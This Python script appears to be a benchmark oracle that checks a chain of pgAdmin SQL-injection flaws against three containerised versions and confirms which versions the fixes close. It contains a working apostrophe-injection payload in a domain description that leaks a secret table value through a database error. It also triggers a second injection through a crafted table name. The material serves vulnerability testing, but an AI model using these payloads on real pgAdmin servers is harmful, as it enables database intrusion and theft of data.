#!/usr/bin/env python3
"""Flag differential oracle for pgadmin-cve-2026-17346.

Chain: CVE-2026-12044 (SQLi via unescaped COMMENT ON ... IS '...' literals;
       qtLiteral hardened + 16 templates switched in 9.16)
    -> CVE-2026-17346 (index Statistics coll_stats.sql sink missed by the fix;
       closed in 9.17 by {{ schema|qtLiteral(conn) }})

V0 = pgAdmin 9.15  (raw '{{ description }}' literals everywhere)
V1 = pgAdmin 9.16  (CVE-2026-12044 fix; coll_stats.sql still unescaped) <- target
V2 = pgAdmin 9.17  (CVE-2026-17346 fix: coll_stats switched to qtLiteral)

Flag: PCB_FLAG planted in the postgres pcb_secret table by the entrypoint
(pg_init.sh, environment-only). SQLi exfil = PostgreSQL error message
(seed) / UNION result row (residual) echoed in pgAdmin's HTTP response.

seed:     POST .../domains/ with apostrophe-injection description
residual: GET  .../tables/<tid>/indexes/stats (UNION in table name)
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import pgadm_util as u  # noqa: E402
sys.path.insert(0, str(HERE.parent.parent))

from flag_oracle import contains_flag  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"


def seed_exploit(*, version="v0") -> dict:
    if not u.wait_ready(version):
        return {"ok": False, "status": 0, "body": "env not ready"}
    s = u.login(version)
    sid = u.ensure_server(version, s)
    did = u.get_did(version, s, sid)
    scid = u.get_scid(version, s, sid, did)
    payload = {
        "name": "pcbdom",
        "basensp": "public",
        "basetype": "text",
        "owner": "postgres",
        "description": (
            "x'; SELECT CAST((SELECT secret FROM pcb_secret LIMIT 1) "
            "AS int) --"
        ),
    }
    r = s.post(
        u.BASE[version] + f"/browser/domain/obj/1/{sid}/{did}/{scid}",
        data=json.dumps(payload),
        headers={"Content-Type": "application/json"},
        timeout=30,
    )
    body = r.text
    return {"ok": contains_flag(body, FLAG), "status": r.status_code,
            "body": body[:400]}


def residual_exploit(*, version="v1") -> dict:
    if not u.wait_ready(version):
        return {"ok": False, "status": 0, "body": "env not ready"}
    s = u.login(version)
    sid = u.ensure_server(version, s)
    did = u.get_did(version, s, sid)
    scid = u.get_scid(version, s, sid, did)
    out = subprocess.run(
        ["docker", "exec", u.PG_CONTAINER[version], "psql", "-U", "postgres",
         "-tAc", "SELECT oid FROM pg_class WHERE relname LIKE 'x'' OR%'"],
        capture_output=True, text=True, timeout=30,
    ).stdout.strip()
    tid = int(out.splitlines()[0]) if out.strip() else -1
    r = s.get(
        u.BASE[version]
        + f"/browser/index/stats/1/{sid}/{did}/{scid}/{tid}",
        timeout=30,
    )
    body = r.text
    return {"ok": contains_flag(body, FLAG), "status": r.status_code,
            "body": body[:400]}


def gate() -> dict:
    s0 = seed_exploit(version="v0")
    s1 = seed_exploit(version="v1")
    r1 = residual_exploit(version="v1")
    r2 = residual_exploit(version="v2")
    return {
        "seed_open_on_v0": s0["ok"],
        "seed_closed_on_v1": not s1["ok"],
        "residual_reaches_flag_on_v1": r1["ok"],
        "residual_blocked_on_v2": not r2["ok"],
        "seed_v0_status": s0["status"],
        "seed_v1_status": s1["status"],
        "residual_v1_status": r1["status"],
        "residual_v2_status": r2["status"],
        "passed": all([s0["ok"], not s1["ok"], r1["ok"], not r2["ok"]]),
    }


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"
    env = {"PCB_FLAG": FLAG}
    all_profiles = ["--profile", "v0", "--profile", "v1", "--profile", "v2"]
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2000:]}
    result = gate()
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--rmi", "all", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
